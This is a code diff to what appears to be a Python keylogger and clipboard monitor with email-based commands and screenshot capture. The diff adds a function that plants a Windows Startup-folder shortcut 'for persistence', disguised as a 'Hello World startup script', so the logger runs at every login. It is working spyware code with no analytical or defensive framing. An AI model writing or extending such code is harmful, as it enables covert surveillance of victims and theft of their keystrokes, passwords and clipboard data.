@@ -30,6 +30,8 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 from concurrent.futures import ThreadPoolExecutor
+import os
+import sys
 
 imaplib.Debug=0
 
@@ -351,6 +353,41 @@ COMMAND_MAP = {
     "ss":  capture_screenshot,
 }
 
+## staruup shortcut for  persistence
+def create_startup_shortcut():
+    """Create a shortcut to this script in the Windows Startup folder."""
+    try:
+        import win32com.client
+    except ImportError:
+        print(
+            "[!] pywin32 is not installed. Run:  pip install pywin32\n"
+            "    Then re-run this script to create the startup shortcut."
+        )
+        return
+ 
+    # Resolve absolute path to this script
+    script_path = os.path.abspath(__file__)
+ 
+    # Windows Startup folder path
+    startup_folder = os.path.join(
+        os.environ["APPDATA"],
+        r"Microsoft\Windows\Start Menu\Programs\Startup",
+    )
+ 
+    shortcut_path = os.path.join(startup_folder, "script.lnk")
+ 
+    shell = win32com.client.Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortcut(shortcut_path)
+ 
+    # Point the shortcut at the Python interpreter so it runs the script
+    shortcut.TargetPath = sys.executable          # e.g. C:\Python312\python.exe
+    shortcut.Arguments = f'"{script_path}"'
+    shortcut.WorkingDirectory = os.path.dirname(script_path)
+    shortcut.Description = "Hello World startup script"
+    shortcut.Save()
+ 
+    print(f"[+] Startup shortcut created:\n    {shortcut_path}")
+
 # ── Entry point ────────────────────────────────────────────────────────────────
 
 def main():
@@ -367,7 +404,7 @@ def main():
 
     # Wait for clipboard thread to finish writing before exit
     
-
+    create_startup_shortcut()
 
     print("[INFO] Starting keystroke logger + clipboard monitor.")
     print(f"       Keystrokes : {OUTPUT_FILE.resolve()}")
